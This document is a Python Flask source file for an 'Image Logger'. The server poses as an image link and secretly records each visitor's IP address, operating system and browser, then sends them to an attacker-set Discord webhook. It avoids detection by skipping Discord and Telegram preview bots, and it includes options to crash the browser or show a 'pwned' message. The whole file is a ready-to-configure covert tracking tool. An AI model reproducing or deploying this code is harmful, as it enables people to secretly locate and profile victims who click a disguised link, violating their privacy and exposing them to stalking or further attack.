from flask import Flask, request, jsonify, redirect
import requests, base64, httpagentparser, traceback
from urllib import parse

app = Flask(__name__)

config = {
    "webhook": "https://discord.com/api/webhooks/your/webhook",
    "image": "https://link-to-your-image.here",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger.",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here",
    },
}

blacklistedIPs = ("27", "104", "143", "164")


def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False


def makeReport(ip, useragent=None, endpoint="N/A"):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }
                ],
            })
        return

    os, browser = httpagentparser.simple_detect(useragent)
    requests.post(config["webhook"], json={
        "username": config["username"],
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **OS:** `{os}`
> **Browser:** `{browser}`
""",
            }
        ],
    })


@app.route("/", methods=["GET", "POST"])
def index():
    try:
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        useragent = request.headers.get("User-Agent", "Unknown")
        makeReport(ip, useragent, endpoint=request.path)

        if config["redirect"]["redirect"]:
            return redirect(config["redirect"]["page"])

        if config["crashBrowser"]:
            return (
                "This browser is crashing...",
                200,
                {"Content-Type": "text/html"},
            )

        return f"<h1>IP Logged: {ip}</h1>", 200

    except Exception:
        traceback.print_exc()
        return jsonify({"error": "An internal error occurred"}), 500


if __name__ == "__main__":
    app.run(debug=True)
